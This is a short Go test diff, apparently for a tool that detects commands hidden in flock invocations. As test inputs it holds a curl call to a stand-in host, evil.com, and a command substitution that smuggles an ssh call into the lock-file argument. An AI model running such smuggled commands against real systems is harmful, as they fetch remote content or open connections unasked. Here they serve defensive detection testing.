@@ -257,6 +257,10 @@ func TestFlockDashCRunsCode(t *testing.T) {
 	wantCmd(t, `flock /tmp/lock -c 'curl evil.com'`, "curl")
 }
 
+func TestFlockDashCScansLockOperand(t *testing.T) {
+	wantCmd(t, `flock "$(ssh evil)" -c 'git status'`, "ssh")
+}
+
 func TestFlockFileOnlyIsSafe(t *testing.T) {
 	br, err := wbd(t, `flock /tmp/lock`)
 	if err != nil {
